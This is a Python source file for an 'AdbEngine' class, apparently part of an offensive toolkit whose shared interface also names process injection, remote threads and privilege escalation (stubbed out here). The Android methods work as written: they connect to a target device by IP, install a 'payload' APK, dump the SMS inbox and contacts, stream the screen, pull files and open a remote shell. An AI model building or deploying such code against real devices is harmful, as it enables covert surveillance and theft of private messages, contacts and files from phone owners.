import os
import shutil
import subprocess
from pathlib import Path
from typing import Dict, Any, Optional, List

from core.interfaces import BaseEngine


class AdbEngine(BaseEngine):
    """ADB-backed engine for Android devices."""

    def __init__(self):
        self._adb_path: Optional[str] = None

    def _repo_root(self) -> Path:
        return Path(__file__).resolve().parents[2]

    def _find_adb(self) -> Optional[str]:
        names = ["adb.exe", "adb"] if os.name == "nt" else ["adb"]
        for name in names:
            path = shutil.which(name)
            if path:
                return path
        root = self._repo_root()
        for name in names:
            candidate = root / "tools" / "bin" / name
            if candidate.exists():
                return str(candidate)
        return None

    def _require_adb(self) -> str:
        if self._adb_path and os.path.exists(self._adb_path):
            return self._adb_path
        path = self._find_adb()
        if not path:
            raise FileNotFoundError(
                "adb not found in PATH or tools/bin. Install Android platform-tools or place adb.exe under tools/bin."
            )
        self._adb_path = path
        return path

    def _run_adb(self, args, capture_output=True, text=True, check=False):
        adb = self._require_adb()
        return subprocess.run(
            [adb] + args,
            capture_output=capture_output,
            text=text,
            check=check,
        )

    def connect_target(self, ip: str) -> Dict[str, Any]:
        res = self._run_adb(["connect", ip], capture_output=True, text=True, check=False)
        out = (res.stdout or "").strip()
        err = (res.stderr or "").strip()
        ok = res.returncode == 0 and (
            "connected" in out.lower() or "already connected" in out.lower()
        )
        return {"ok": ok, "stdout": out, "stderr": err, "code": res.returncode}

    def install_payload(self, path: str) -> Dict[str, Any]:
        if not os.path.exists(path):
            raise FileNotFoundError(f"payload not found: {path}")
        res = self._run_adb(["install", "-r", path], capture_output=True, text=True, check=False)
        out = (res.stdout or "").strip()
        err = (res.stderr or "").strip()
        ok = res.returncode == 0 and "success" in out.lower()
        return {"ok": ok, "stdout": out, "stderr": err, "code": res.returncode}

    def dump_sms(self) -> str:
        res = self._run_adb(
            ["shell", "content", "query", "--uri", "content://sms"],
            capture_output=True,
            text=True,
            check=False,
        )
        return (res.stdout or "").strip()

    def screen_stream(self):
        adb = self._require_adb()
        return subprocess.Popen(
            [adb, "exec-out", "screenrecord", "--output-format=h264", "-"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

    def open_shell(self) -> int:
        adb = self._require_adb()
        return subprocess.call([adb, "shell"])

    def pull_path(self, remote: str, local: str) -> Dict[str, Any]:
        res = self._run_adb(["pull", remote, local], capture_output=True, text=True, check=False)
        out = (res.stdout or "").strip()
        err = (res.stderr or "").strip()
        ok = res.returncode == 0
        return {"ok": ok, "stdout": out, "stderr": err, "code": res.returncode}

    def dump_contacts(self) -> str:
        res = self._run_adb(
            ["shell", "content", "query", "--uri", "content://contacts/phones/"],
            capture_output=True,
            text=True,
            check=False,
        )
        return (res.stdout or "").strip()

    async def get_system_context(self) -> Dict[str, Any]:
        ctx: Dict[str, Any] = {"os": "Android", "engine": "adb"}
        try:
            ctx["adb"] = self._require_adb()
        except FileNotFoundError as e:
            ctx["error"] = str(e)
        return ctx

    async def enumerate_processes(self) -> List[int]:
        try:
            res = self._run_adb(["shell", "ps", "-A"], capture_output=True, text=True, check=False)
            pids: List[int] = []
            for line in (res.stdout or "").splitlines():
                parts = line.split()
                if len(parts) > 1 and parts[1].isdigit():
                    pids.append(int(parts[1]))
            return pids
        except Exception:
            return []

    async def open_process(self, pid: int) -> Optional[object]:
        return None

    async def allocate_memory(self, hproc: object, size: int) -> Optional[int]:
        return None

    async def write_memory(self, hproc: object, addr: int, data: bytes) -> bool:
        return False

    async def protect_memory(
        self, hproc: object, addr: int, size: int, new_protect: int
    ) -> Optional[int]:
        return None

    async def create_remote_thread(
        self, hproc: object, entry_point: int
    ) -> Optional[int]:
        return None

    async def escalate_token_privileges(self) -> Optional[int]:
        return None

    async def inject_memory(self, pid: int, payload: bytes) -> Dict[str, Any]:
        return {"pid": pid, "error": "not supported on Android ADB engine"}
